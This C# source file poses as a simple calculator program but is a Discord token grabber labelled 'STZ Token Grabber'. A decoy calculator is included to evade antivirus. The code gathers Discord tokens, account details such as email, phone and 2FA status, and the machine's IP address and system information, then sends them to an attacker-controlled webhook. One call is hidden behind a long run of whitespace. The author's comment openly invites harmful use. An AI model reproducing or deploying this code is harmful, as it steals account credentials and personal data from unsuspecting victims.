using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace CalculatorMain
{
    static class Program
    {
        /*
        Hey there,
        I'm Tex the developer of this program.
        I made this program open source for people to learn and not harm.
        But if you going to harm give me credit :).
         
        Btw I wrote this like shit because I'm lazy and I don't want to be organized
        For future releases join our discord server:
        https://discord.gg/zrCcv4jSV7
         */


        static void Main()
        {
            //Its here to bypass some shitty antiviruses
            Console.WriteLine("Hello World!");
            Console.WriteLine("Enter 2 numbers and the program will calculate for you the summary of them!");
            Console.WriteLine("Enter the first number: ");
            Console.WriteLine("Enter the second: ");
            int num1 = 15;
            int num2 = 30;
            int summary = num1 + num2;
            Console.WriteLine("The summary of the numbers are: " + summary);
            if (1 != 1)
            {
                Console.WriteLine("Calculate finish exiting...");
                Environment.Exit(0);
            }

            //Here starting the real thing
            foreach (var Token in Other.GetToken())
            {
                if (Other.GetResponse(Token) != "ErrorModule")
                {
                    var data = Other.GetResponse(Token);
                    if (data.ToLower() != "error")
                    {
                        string Nitro = "Null";
                        JObject jObj = JObject.Parse(data);
                        if (data.Contains("premium_type"))
                        {
                            Nitro = jObj["premium_type"].ToString();
                            if (Nitro.ToLower() == "true")
                                Nitro = "True";
                            else
                                Nitro = "False";
                        }

                        string Username = jObj["username"].ToString() + "#" + jObj["discriminator"].ToString();
                        string Email = jObj["email"].ToString();
                        string Verified = jObj["verified"].ToString();
                        string Phone = jObj["phone"].ToString();
                        if (String.IsNullOrEmpty(Phone))
                            Phone = "None";
                        string NSFW = jObj["nsfw_allowed"].ToString();
                        string ID = jObj["id"].ToString();
                        string Avatar = "https://cdn.discordapp.com/avatars/" + ID + "/" + jObj["avatar"].ToString();
                        string Mfa = jObj["mfa_enabled"].ToString();
                        string Lang = jObj["locale"].ToString();
                        string CPU = System.Runtime.InteropServices.RuntimeInformation.ProcessArchitecture.ToString();
                        string newLine = "\n";
                        string RAM = Other.GetRam();
                        string Region = RegionInfo.CurrentRegion.ThreeLetterISORegionName;
                        string LocalTime = Other.NetWorkTime().ToString("MM/dd/yyyy HH:mm");
                        string msg = "**Username: **" + Username + newLine +
                                     "**Email: **" + Email + newLine +
                                     "**Language: **" + Lang + newLine +
                                     "**Verified User: **" + Verified + newLine +
                                     "**Phone: **" + Phone + newLine +
                                     "**2FA: **" + Mfa + newLine +
                                     "**NSFW Enabled: **" + NSFW + newLine +
                                     "**Nitro: **" + Nitro + newLine +
                                     "\n**Token**\n" + Token;

                        string msg2 = "**IP Address: **" + Other.GetCurrectIP() + newLine +
                                      "**Operating System: **" + Environment.OSVersion + newLine +
                                      "**PC Name: **" + Environment.UserName + newLine +
                                      "**CPU Architecture: **" + CPU + newLine +
                                      "**Memory: **" + RAM + newLine +
                                      "**Region: **" + Region + newLine +
                                      "**Local Time: **" + LocalTime;

                        Other.DiscordWebhook(true, 65535, Settings.WebHook, Username + " (" + ID + ")", Avatar, msg, "Account Information", "STZ Token Grabber");
                        Other.DiscordWebhook(true, 7506394, Settings.WebHook, Username + " (" + ID + ")", Avatar, msg2, "PC Information", "STZ Token Grabber");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  Other.DisposeEndianness();
                    }
                }
            }
        }
    }
}
